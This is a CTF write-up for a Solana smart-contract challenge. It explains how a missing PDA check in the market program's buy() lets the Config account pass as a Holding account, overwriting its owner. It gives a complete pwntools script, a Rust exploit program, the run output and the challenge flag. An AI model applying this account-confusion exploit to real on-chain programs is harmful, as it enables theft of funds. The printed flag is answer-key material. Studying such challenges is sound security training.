# Blockchain/Market Writeup

Market 485 NoobMaster

A market where the flag does not exist...

attachments
market.zip

## Solution

**Step 1:**

First I unzipped the chall folder and looked through server/src/main.rs and then found the win condtion:
```
    if current_owner == user.pubkey() {
        let flag = fs::read_to_string("flag.txt").unwrap();
        writeln!(socket, "Did you just steal the market from ME?? I SHALL BE BACK!: {}", flag)?; // NoobMaster is MAD?!

    }
````
Next, I looked through the program/src files and found an interesting weakness in processor.rs:

```
    let (user_config_pda, user_config_bump) = Pubkey::find_program_address(&[user.key.as_ref(), b"USER"], program);
    let (holding_pda, holding_expected_bump) = Pubkey::find_program_address(&[user.key.as_ref(), b"HOLDING", item.key.as_ref()], program);
    let (system_config_pda, system_expected_bump) = Pubkey::find_program_address(&[b"CONFIG"], program);
    let (treasury_pda, treasury_expected_bump) = Pubkey::find_program_address(&[b"VAULT"], program);

    if (*treasury.key != treasury_pda) || (treasury_bump != treasury_expected_bump) {
        return Err(ProgramError::InvalidAccountData);
    }
    if (*system_config.key != system_config_pda) || (config_bump != system_expected_bump) {
        return Err(ProgramError::InvalidAccountData);
    }

    if (*user_config.key != user_config_pda) || (user_bump != user_config_bump) {
        return Err(ProgramError::InvalidAccountData);
    }
```

I found that user_config_pda, system_config_pda, and treasury_pda were all validated but holding_pda was created but not validated. 

In buy, the account we pass is deserialized as a Holding account and its owner, item, and quantity fields are changed. Because the program never verifies that holding has the expected holding PDA, we can pass another account instead.

```
let holding_data = &mut Holding::deserialize(&mut &(*holding.data).borrow_mut()[..])?;
holding_data.owner = *user.key;
holding_data.item = *item.key;
holding_data.quantity += 1;
holding_data.serialize(&mut &mut (*holding.data).borrow_mut()[..]).unwrap();
```
Since they have the same seralized layout and there is no validation, if we pass Config as ```holding``` then it will be:
```
CONFIG.owner = user
```
This achieves our win condition by overwriting the CONFIG owner and gets us the flag.

**Step 2:**

The next step is to see which accounts can be passed as the holding account and modified. Looking at processor.rs, we can see that CONFIG and HOLDING have the same layout:
```
#[derive(BorshSerialize, BorshDeserialize)]
pub struct Config {
    pub owner: Pubkey,
    pub treasury: Pubkey,
    shop_item_count: u64,
}

#[repr(C)]
#[derive(BorshSerialize, BorshDeserialize)]
pub struct User {
    id: u32,
    authority: Pubkey,
}

#[repr(C)]
#[derive(BorshSerialize, BorshDeserialize)]
pub struct Item {
    name: String,
    index: u64,
    cost: u64,
    stock: u64,
}

#[repr(C)]
#[derive(BorshSerialize, BorshDeserialize)]
pub struct Holding {
    owner: Pubkey,
    item: Pubkey,
    quantity: u64,
}
```    
This means that we can modify the values for CONFIG since it never checks the holding pda as described in step 1.

**Step 3:**

We need an item to buy. Looking again at processer.rs:
```
    let item0_data = Item {
        name: "Rubber Ducky".to_string(),
        index: 1337,
        cost: 2_000_000_000, // 2 SOL
        stock: 1337,
    };

    let item1_data = Item {
        name: "Shell".to_string(),
        index: 4919,
        cost: 5_000_000_000, // 5 SOL
        stock: 1,
    };
    // Write data to PDAs
    config_data.serialize(&mut &mut (*config.data).borrow_mut()[..]).unwrap();
    item0_data.serialize(&mut &mut (*item0.data).borrow_mut()[..]).unwrap();
    item1_data.serialize(&mut &mut (*item1.data).borrow_mut()[..]).unwrap();

    Ok(())
```

While it might seem logical to buy shell, rubber duck is cheaper. Since the item_id is 1337, and ```1337!=0``` then it still enters the else branch intended for shell. That branch never checks that item.key is valid and just derives the shell pda. Thus, we can just use the Rubber Duck.
```
    if (item_id == 0) {
        let (item0_pda, item0_expected_bump) = Pubkey::find_program_address(&[b"RUBBERDUCK"], program);
        if (*item.key != item0_pda) || (item_bump != item0_expected_bump) {
            return Err(ProgramError::InvalidAccountData);
        }
    }
    else {
        let (item1_pda, item1_expected_bump) = Pubkey::find_program_address(&[b"SHELL"], program);
    }
```

Therfore, we can pass:
```
item_id = 1337
item = RUBBERDUCK
```

**Step 4:**
Next, we look inside the solve folder and find an example already set up. 

Using this example, I created a Rust solver.

I wrote a solve.py that does the following:
1. Send Solver Program pubkey and length
2. Get Market Program ID and User Account
3. Derives CONFIG and RUBBERDUCK using same code as the program
4. Derives Vault and User PDA using:
```
treasury, treasury_bump = Pubkey.find_program_address(
    [b"VAULT"],
    program,
)
user_config, user_bump = Pubkey.find_program_address(
    [bytes(user), b"USER"],
    program,
)
```
5. Build Accounts and Send Each Account
6. solve.so (Compiled version of lib.rs) exploits the market
7. Read Flag

Full Solve.py
```python
jason@MainXuComputer:/mnt/c/Users/linaw/Downloads/market/solve$ cat solve.py
#!/usr/bin/env python3

from pwn import *
from solders.pubkey import Pubkey
from solders.system_program import ID as SYSTEM_PROGRAM
import subprocess
import os

context.log_level = "info"

HOST = "challs.scriptsorcerers.xyz"
PORT = 10018

HERE = os.path.dirname(os.path.abspath(__file__))

subprocess.run(
    ["cargo", "build-sbf"],
    cwd=HERE,
    check=True,
)

solve_path = os.path.join(
    HERE,
    "target",
    "deploy",
    "solve.so",
)

with open(solve_path, "rb") as f:
    solve = f.read()

log.info(f"solver size = {len(solve)} bytes")

SOLVER_PROGRAM = Pubkey.from_string(
    "5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx"
)

r = remote(HOST, PORT)

r.recvuntil(b"program pubkey: ")
r.sendline(str(SOLVER_PROGRAM).encode())

r.recvuntil(b"program len: ")
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b"program: ")
program = Pubkey.from_string(r.recvline().strip().decode())

r.recvuntil(b"user: ")
user = Pubkey.from_string(r.recvline().strip().decode())

log.info(f"market program = {program}")
log.info(f"user           = {user}")

config, config_bump = Pubkey.find_program_address(
    [b"CONFIG"],
    program,
)

item0, item0_bump = Pubkey.find_program_address(
    [b"RUBBERDUCK"],
    program,
)

treasury, treasury_bump = Pubkey.find_program_address(
    [b"VAULT"],
    program,
)

user_config, user_bump = Pubkey.find_program_address(
    [bytes(user), b"USER"],
    program,
)

log.info(f"CONFIG     = {config} bump={config_bump}")
log.info(f"RUBBERDUCK = {item0} bump={item0_bump}")
log.info(f"VAULT      = {treasury} bump={treasury_bump}")
log.info(f"USER PDA   = {user_config} bump={user_bump}")

accounts = [
    ("x",  program),
    ("ws", user),
    ("w",  user_config),
    ("w",  config),
    ("w",  item0),
    ("w",  treasury),
    ("x",  SYSTEM_PROGRAM),
]

r.recvuntil(b"num accounts:")
r.sendline(str(len(accounts)).encode())

for perms, pubkey in accounts:
    r.sendline(
        f"{perms} {pubkey}".encode()
    )

payload = b""

r.sendline(str(len(payload)).encode())

if payload:
    r.send(payload)

r.interactive()
```

Next I created lib.rs in solve/src/lib.rs to do the following:
1. Recieve accounts from solve.py
2. Derive User PDA, Config PDA, Rubber Ducky bump, treasury bump
3. Create Market User
4. Depsoit 2.1 Sol
5. Construct ```buy()``` for Rubber Ducky by passing config in the holding parameter instead of the actual holding account
6. Execute buy and config is overwritten

```
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let market_program = next_account_info(accounts_iter)?;
    let user = next_account_info(accounts_iter)?;
    let user_config = next_account_info(accounts_iter)?;
    let config = next_account_info(accounts_iter)?;
    let item0 = next_account_info(accounts_iter)?;
    let treasury = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    let (_, user_bump) = Pubkey::find_program_address(
        &[user.key.as_ref(), b"USER"],
        market_program.key,
    );

    let (_, config_bump) = Pubkey::find_program_address(
        &[b"CONFIG"],
        market_program.key,
    );

    let (_, item0_bump) = Pubkey::find_program_address(
        &[b"RUBBERDUCK"],
        market_program.key,
    );

    let (_, treasury_bump) = Pubkey::find_program_address(
        &[b"VAULT"],
        market_program.key,
    );

    let ix = market::initialize_user(
        *market_program.key,
        *user.key,
        *user_config.key,
        user_bump,
        0,
    );

    invoke(
        &ix,
        &[
            user.clone(),
            user_config.clone(),
            system_program.clone(),
            market_program.clone(),
        ],
    )?;

    let ix = market::deposit(
        *market_program.key,
        *user.key,
        *user_config.key,
        user_bump,
        2_100_000_000,
    );

    invoke(
        &ix,
        &[
            user.clone(),
            user_config.clone(),
            system_program.clone(),
            market_program.clone(),
        ],
    )?;

    let ix = market::buy(
        *market_program.key,
        *user.key,
        *user_config.key,
        *config.key,
        *treasury.key,
        *config.key,
        *item0.key,
        user_bump,
        config_bump,
        item0_bump,
        1337,
        treasury_bump,
        0,
    );

    invoke(
        &ix,
        &[
            user.clone(),
            user_config.clone(),
            config.clone(),
            treasury.clone(),
            config.clone(),
            item0.clone(),
            system_program.clone(),
            market_program.clone(),
        ],
    )?;

    Ok(())
}
```

I also created Cargo.toml to instruct Cargo on how to build:

```
[package]
name = "solve"
version = "0.1.0"
edition = "2021"

[dependencies]
solana-program = "=2.2.1"
market = { path = "../program", features = ["no-entrypoint"] }

[lib]
crate-type = ["cdylib", "lib"]
```


**Step 5:** 
To set up the solve script do:
```
source ~/venv/bin/activate
python3 solve.py
```

Truncated Output:
```
...
[*] solver size = 31112 bytes
[+] Opening connection to challs.scriptsorcerers.xyz on port 10018: Done
[*] market program = 111BuZ6b86gm7XhxjvTakhRvxSMjXp2GqgifkNUmDK
[*] user           = HNAXQk6hRtB3WanULAoRf8DdSQYu7LGfjw6171fqNxcJ
[*] CONFIG     = B5tDYnKwKUoxLzzz9JpgnBzXB6Y7JS62VeGoMLCnXhFU bump=255
[*] RUBBERDUCK = 2NdmCJrcBNGKk8f4hiYe7dnGgP22JJDVWHhVFLi74162 bump=255
[*] VAULT      = 62HF13qXYbe2Br7uF7DsT6vwmCCPEshbavkC1E412NhY bump=253
[*] USER PDA   = Bq2mBLYVVHQsYvTpFQLSabCroja5yfU34RbV1UGpywpi bump=254
[*] Switching to interactive mode

ix len:
Done
Current owner: HNAXQk6hRtB3WanULAoRf8DdSQYu7LGfjw6171fqNxcJ
Did you just steal the market from ME?? I SHALL BE BACK!: scriptCTF{w41t_4_s3c0nd_wh0_4r3_y0u???_f201f346fe24}

[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to challs.scriptsorcerers.xyz port 10018
```

Flag: **scriptCTF{w41t_4_s3c0nd_wh0_4r3_y0u???_f201f346fe24}**

## Summary
1. Notice win condition was ```current_owner == user.pubkey()```; ```buy()``` creates holding PDA but did not check holding account pub to make sure it is valid.
2. Notice config and holding account have same serialized format and that config can be passed as holding
3. Notice that we can buy rubber duck (with ```item_id=1337```) and that it stills enters the nonzero item branch which fails to validate the expected Shell PDA
4. Create rust solver and compile
5. Run it, overwrite ```CONFIG.owner``` using buy() vulnerbaility, and obtain the flag
